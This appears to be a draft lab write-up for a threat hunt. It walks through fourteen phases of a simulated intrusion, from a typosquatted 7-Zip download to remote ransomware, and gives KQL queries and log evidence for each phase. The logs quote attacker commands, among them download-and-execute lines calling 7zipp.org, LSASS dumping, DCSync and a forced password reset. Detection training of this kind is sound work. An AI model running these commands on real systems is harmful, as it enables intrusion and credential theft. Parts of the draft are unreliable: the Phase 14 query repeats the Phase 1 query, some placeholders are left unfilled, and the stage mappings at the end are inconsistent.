### **Phase 1: Initial Access & Execution**

**What Happened:** The attack began when the user `perry.parsons` on workstation `WKSTN-03` needed a 7-Zip tool. He googled it, clicked a typosquatted link (`7zipp.org`), and downloaded a trojanized installer. This installer executed a PowerShell script (`7z.ps1`) directly from the attacker's server to establish the initial foothold. The typosquatted domain impersonated ... The downloaded file was automatically executed from the browser
**How to Find It:** You are looking for a PowerShell process that was likely spawned by a browser and contains a command to download and execute a script (`iwr` for `Invoke-WebRequest` and `iex` for `Invoke-Expression`).

**KQL Query:**
```
process.name: "powershell.exe" AND process.command_line: *iex* AND process.command_line: *iwr* AND process.command_line: *7zipp.org*
```
  User: not anna.jones
**Log Evidence and IoC:**
`powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)` at `Sep 26, 2023 @ 14:23:02`

# Phase 2: Persistence (Service Creation)
What Happened: The attacker's first script (7z.ps1) immediately created a malicious Windows service named 7zService. This ensures the malware will automatically restart with SYSTEM privileges every time the computer reboots. The script was executed by... The origin of the Powershell process.
How to Find It:
Hunt for the Service Control binary, sc.exe, being used to create a new service.KQL 

Query: process.name: "sc.exe" AND process.command_line: *create* AND process.command_line: *7zService*
Log Evidence:"C:\Windows\system32\sc.exe" create 7zService binpath= "C:\Program Files\7-zip\7zipp.exe" start=auto obj=LocalSystem at Sep 26, 2023 @ 14:23:23

# Phase 3: Defense Evasion (Rundll32 Execution
)What Happened: Instead of running the malicious executable directly, the service executed a malicious DLL (7zipp.dll) using a legitimate Windows binary, rundll32.exe. This is a classic technique to mask malicious activity within a trusted system process. ( Add Initial delivery or installation steps)
How to Find It:
Look for rundll32.exe being executed with the malicious DLL as an argument. You can also see its parent process is powershell.exe, linking it to our attack.
KQL Query: process.name: "rundll32.exe" AND process.command_line: *7zipp.dll*
Log Evidence:"C:\Windows\system32\rundll32.exe" "C:\Program Files\7-zip\7zipp.dll",Start at Sep 26, 2023 @ 14:23:48
# Phase 4: Credential Access (NanoDump)
What Happened: With a foothold established, the attacker's next goal was to steal credentials. They downloaded and executed Invoke-NanoDump.ps1 to dump passwords from the LSASS process memory. (add script behaviour such as whether it involves downloading a malicious DLL or using rundll32 to execute it)
How to Find It:
Search for PowerShell commands containing the string "NanoDump".
KQL Query :process.name: "powershell.exe" AND process.command_line: *Invoke-NanoDump*
Log Evidence:powershell.exe -C iex(iwr https://raw.githubusercontent.com/.../Invoke-NanoDump.ps1 -useb); Invoke-Nanodump; at Sep 26, 2023 @ 14:24:22
# Phase 5: Credential Access (Mimikatz Download)
What Happened: NanoDump was just the start. The attacker then downloaded the full Mimikatz suite (mimikatz_trunk.zip) to prepare for more advanced attacks like Pass-the-Hash. 
How to Find It: Look for PowerShell download commands (iwr) targeting GitHub for mimikatz.
KQL Query :process.name: "powershell.exe" AND process.command_line: *mimikatz_trunk.zip*
Log Evidence:powershell.exe -C iwr https://github.com/gentilkiwi/mimikatz/releases/download/.../mimikatz_trunk.zip -outfile m.zip at Sep 26, 2023 @ 14:28:53
# Phase 6: Discovery (BloodHound)
What Happened: Before moving, the attacker needed a map. They executed Invoke-Bloodhound to collect data on Active Directory users, groups, and permissions, allowing them to find a path to a domain administrator.
How to Find It:
Search for PowerShell commands invoking Invoke-Bloodhound.
KQL Query:
process.name: "powershell.exe" AND process.command_line: *Invoke-Bloodhound*
Log Evidence:powershell.exe -C iex(iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -useb); Invoke-Bloodhound -c all at Sep 26, 2023 @ 14:26:46
# Phase 7: Persistence (Account Manipulation)
What Happened: The attacker found a target account, anna.jones. To gain full control, they used PowerView.ps1 (part of the PowerSploit suite) to forcibly reset her password to pwn3dpw!!!. This gives them a legitimate account to use for persistence.
How to Find It:
Look for the Set-DomainUserPassword command, a key indicator of account manipulation.
KQL Query :process.name: "powershell.exe" AND process.command_line: *Set-DomainUserPassword*
Log Evidence:powershell.exe -C iex(iwr ...PowerView.ps1 -useb); Set-DomainUserPassword -Identity anna.jones -AccountPassword ... 'pwn3dpw!!!' ... at Sep 26, 2023 @ 14:32:37
# Phase 8: Lateral Movement (Pass-the-Hash) 
What Happened: This was a tricky phase where the simulator combined events. The attacker used Mimikatz's sekurlsa::pth to perform a Pass-the-Hash attack, impersonating a user (identified as james.cromwell by the sim). They then validated this remote access by running Invoke-Command {whoami}.
How to Find It:
In a real scenario, you'd hunt for abnormal Invoke-Command usage. In this lab, the key was linking the mimikatz.exe and sekurlsa::pth IOCs to the first successful Invoke-Command after the Mimikatz download.
KQL Query: process.name: "powershell.exe" AND process.command_line: *Invoke-Command* AND process.command_line: *whoami*
Log Evidence:powershell.exe -C invoke-COmmand -scriptblock {whoami} at Sep 26, 2023 @ 14:29:43 (This was the specific timestamp the simulator accepted).
# Phase 9: Lateral Movement (Foothold on WKSTN-02)
What Happened: The attacker used their new password for anna.jones to move laterally to her machine, WKSTN-02. They used Invoke-Command to force WKSTN-02 to download and run the same 7zipp.dll payload.
How to Find It:
On WKSTN-02, look for the WinRM host process (wsmprovhost.exe) spawning rundll32.exe under the anna.jones user context.KQL Query:host.name: "WKSTN-02" AND process.name: "rundll32.exe" AND user.name: "anna.jones" AND process.parent.name: "wsmprovhost.exe"
Log Evidence:The Invoke-Command from the logs: Invoke-Command -ScriptBlock {powershell iwr http://www.7zipp.org/a/7zipp.dll ...; rundll32.exe ...} -ComputerName WKSTN-02 -Credential ... at Sep 26, 2023 @ 14:54:45
# Phase 10: Credential Access (Browser Passwords)
What Happened: Now on WKSTN-02, the attacker stole passwords saved in the browser. They downloaded and executed Invoke-SharpChromium to dump passwords and cookies from anna.jones's profile.
How to Find It:
Search for PowerShell commands invoking Invoke-SharpChromium.
KQL Query: process.name: "powershell.exe" AND process.command_line: *Invoke-SharpChromium*
Log Evidence:powershell.exe -C iex(iwr https://raw.githubusercontent.com/.../Invoke-SharpChromium.ps1 -useb); Invoke-SharpChromium -Command 'all' at Sep 26, 2023 @ 15:08:24
# Phase 11: Discovery (Group Enumeration)
What Happened: The attacker needed to find a path to Domain Admin. They used PowerView again to list all domain groups (Get-DomainGroup) and then specifically check the members of the AD Recovery group.
How to Find It:
Look for PowerShell commands using Get-DomainGroup or Get-DomainGroupMember.KQL Query:process.name: "powershell.exe" AND process.command_line: *Get-DomainGroupMember*
Log Evidence:powershell.exe -C iex(iwr ...PowerView.ps1 -useb); Get-DomainGroupMember -Identity 'AD Recovery' at Sep 26, 2023 @ 15:14:26
# Phase 12: Privilege Escalation
What Happened: After finding the AD Recovery group, the attacker used another set of stolen credentials (for itadmin) to add the anna.jones account to that high-privilege group. This escalated anna.jones's permissions significantly.
How to Find It:
Look for the Add-DomainGroupMember command.KQL Query:process.name: "powershell.exe" AND process.command_line: *Add-DomainGroupMember*
Log Evidence:powershell.exe -C $username='SSF\itadmin'; ... Add-DomainGroupMember -Identity 'AD Recovery' -Members anna.jones -Credential ... at Sep 26, 2023 @ 15:15:34
# Phase 13: Credential Access (DCSync)
What Happened: Now that anna.jones had high privileges, the attacker used her account to run Invoke-SharpKatz and perform a DCSync attack. This technique impersonates a Domain Controller and asks the real DC to replicate its password data, giving the attacker the password hash for the damian.hall (IT Admin) account.
How to Find It:
Look for PowerShell commands running Invoke-SharpKatz and the dcsync command.
KQL Query: process.name: "powershell.exe" AND process.command_line: *Invoke-SharpKatz* AND process.command_line: *dcsync*
Log Evidence:powershell.exe -C iex(iwr ...Invoke-SharpKatz.ps1 -useb); Invoke-Sharpkatz --Command dcsync --Domain swiftspendfinancial.thm ... --User damian.hall at Sep 26, 2023 @ 15:17:19
# Phase 14: Impact (Ransomware Execution)
What Happened: With the damian.hall (IT Admin) credentials, the attacker now had the "keys to the kingdom." They used these credentials to remotely execute the final ransomware payload, bomb.exe, on both WKSTN-03 and WKSTN-02, encrypting all files.
How to Find It:
Hunt for the bomb.exe process creation. The Sysmon logs you extracted show it was created by wsmprovhost.exe (meaning it was run remotely via Invoke-Command) and ran as damian.hall.
KQL Query: process.name: "powershell.exe" AND process.command_line: *iex* AND process.command_line: *iwr* AND process.command_line: *7zipp.org*
Log Evidence (on WKSTN-03):process.name: bomb.exe, user.name: damian.hall, process.parent.name: wsmprovhost.exe at Sep 26, 2023 @ 15:41:51
Log Evidence (on WKSTN-02):
process.name: bomb.exe, user.name: damian.hall, process.parent.name: wsmprovhost.exe at Sep 26, 2023 @
```


## Technique and tactics identified

The following is a breakdown of all techniques and tactics, correctly and incorrectly identified in the attack chain.

#### Techniques

- Create or Modify System ProcessStage 1 
- System Binary Proxy ExecutionStage 2
- Exploit Public-Facing ApplicationStage 3
- Account ManipulationStage 4
- Account DiscoveryStage 5
- Abuse Elevation Control MechanismStage 6
- Account DiscoveryStage 7 **
- OS Credential DumpingStage 8 **
- Data Encrypted for ImpactStage 9
- Use Alternate Authentication MaterialStage 10 **
- OS Credential DumpingStage 11

---

#### Tactics

- PersistenceStage 1
- Defense EvasionStage 2
- Initial AccessStage 3
- PersistenceStage 4
- DiscoveryStage 5
- Privilege EscalationStage 6
- DiscoveryStage 7 **
- Credential AccessStage 8 **
- ImpactStage 9
- Lateral MovementStage 10 **
- Credential AccessStage 11
  
- WKSTN-02
- WKSTN-02
- WKSTN-02
- WKSTN-02
- WKSTN-02
- WKSTN-02 **
- WKSTN-02
- WKSTN-02
- WKSTN-03
- WKSTN-02
- WKSTN-02
  
  #### Host based

- 7z2301-x64.msiStage 1
- 7z.ps1Stage 2
- 7zlegit.exeStage 2
- powershell.exeStage 2
- 7zServiceStage 3
- 7zipp.exeStage 3
- 7zipp.dllStage 4
- rundll32.exeStage 4
- Invoke-NanoDumpStage 5 **
- pwrex.ps1Stage 5
- trash.evtxStage 5
- SharpHound.ps1Stage 6 **
- BloodHoundStage 6 **
- mimikatz_trunk.zipStage 7
- m.zipStage 7
- mimikatz.exeStage 8
- sekurlsa::pthStage 8
- pwn3dpw!!!Stage 9
- PowerView.ps1Stage 9 **
- Set-DomainUserPasswordStage 9
- 7zip.dllStage 10
- 7zip2.dllStage 10
- powershell.exeStage 10 **
- Invoke-SharpChromium.ps1Stage 11
- SharpChrome.exeStage 11
- chrome.exeStage 11
- certutilStage 11

---

#### Network based

- www.7zipp.orgStage 1 **
- 206.189.34.218Stage 1
- www.7zipp.orgStage 2
- 206.189.34.218Stage 3
- 206.189.34.218Stage 4
- 206.189.34.218Stage 5
- raw.githubusercontent.comStage 5 **
- 7zipp.dllStage 10
- www.7zipp.orgStage 10
- raw.githubusercontent.comStage 11